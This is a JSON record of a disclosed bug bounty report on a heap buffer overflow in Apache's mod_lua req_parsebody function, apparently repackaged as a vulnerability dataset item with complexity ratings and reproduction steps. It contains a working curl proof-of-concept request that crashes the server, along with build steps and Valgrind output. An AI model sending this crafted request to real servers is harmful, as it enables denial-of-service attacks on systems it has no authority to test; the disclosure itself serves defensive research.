{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "chamal ",
  "title": "Buffer overflow in req_parsebody method in lua_request.c",
  "content": "\nSoftware Versions\nUbuntu - 18.04 (32-bit)\nApache 2.4.51 (32-bit)\nDescription\nThis bug is present in \"req_parsebody\" method of modules/lua/lua_request.c file.\nBelow mentioned lines of code cause this bug.\nCode 152 Bytes\n1  ...\n2  size_t  vlen = 0;\n3  ...\n4  ...\n5  vlen = end - crlf - 8;\n6  buffer = (char *) apr_pcalloc(r->pool, vlen+1);\n7  memcpy(buffer, crlf + 4, vlen);\n8  ...\nAbove code does not check whether the result of (end - crlf) is greater than or equal to 8.\nSo it is possible to make the result of (end - crlf - 8), negative.\nSending this HTTP request causes the result to be -1.\ncurl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\\r\\n\\r\\naaa-' http://127.0.0.1/test.lua\nSince \"vlen\" is of type \"size_t\", -1 will become 4294967295. This is the maximum value of size_t data type in 32 bit systems.\nThen vlen+1 is passed to apr_pcalloc method.\nSo the actual size allocated is 0.\nSince the allocated buffer is too small there will be an overflow and crash in next memcpy statement.\nSteps to Reproduce\nBuild Apache web server with Lua module\n./configure --enable-lua=shared\nmake\nmake install\n  LoadModule lua_module modules/mod_lua.so\n\nCopy attached test.lua (F1555487) file to htdocs folder.\nStart Apache web server in debug single worker mode.\n./httpd -X -d /home/apache/install-directory/\nSend this HTTP request with CURL.\ncurl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\\r\\n\\r\\naaa-' http://127.0.0.1/test.lua\nApache web server will crash.\nValgrind Output\nCommand: valgrind ./httpd -X -d /home/apache/install-directory/\nInvalid write of size 1\nat 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\nby 0x501355B: req_parsebody (lua_request.c:415)\nby 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x500D02B: lua_handler (mod_lua.c:323)\nby 0x15F9E4: ap_run_handler (config.c:169)\nby 0x16040C: ap_invoke_handler (config.c:443)\nAddress 0x12aec000 is not stack'd, malloc'd or (recently) free'd\nProcess terminating with default action of signal 11 (SIGSEGV)\nAccess not within mapped region at address 0x12AEC000\nat 0x483513B: memcpy (in /usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)\nby 0x501355B: req_parsebody (lua_request.c:415)\nby 0x503628E: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5041A1F: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x50365E5: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5030D96: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5035C1A: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5036886: ??? (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x5032556: lua_pcallk (in /usr/lib/i386-linux-gnu/liblua5.2.so.0.0.0)\nby 0x500D02B: lua_handler (mod_lua.c:323)\nby 0x15F9E4: ap_run_handler (config.c:169)\nby 0x16040C: ap_invoke_handler (config.c:443)\nImpact\nMay be possible to use in a denial of service attack.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 500,
  "weaknesses": [
    "Heap Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1641328260,
  "report_url": "https://hackerone.com/reports/1434056",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Build Apache web server with Lua module using: ./configure --enable-lua=shared; make; make install"
    ],
    [
      2,
      "Send a crafted HTTP request with curl: curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\\r\\n\\r\\naaa-' http://127.0.0.1/test.lua"
    ]
  ],
  "vuln_description": "A buffer overflow vulnerability exists in the 'req_parsebody' method of lua_request.c in Apache's Lua module. The vulnerability occurs due to insufficient bounds checking when calculating the length of data to copy, allowing a negative value to be converted to a very large unsigned value, leading to a buffer overflow and potential crash.",
  "reason": "The vulnerability requires understanding of HTTP multipart form data parsing and buffer overflow concepts, but the attack itself is straightforward once the vulnerable code path is identified. The main complexity comes from recognizing the unsigned integer wrap-around issue in the length calculation.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}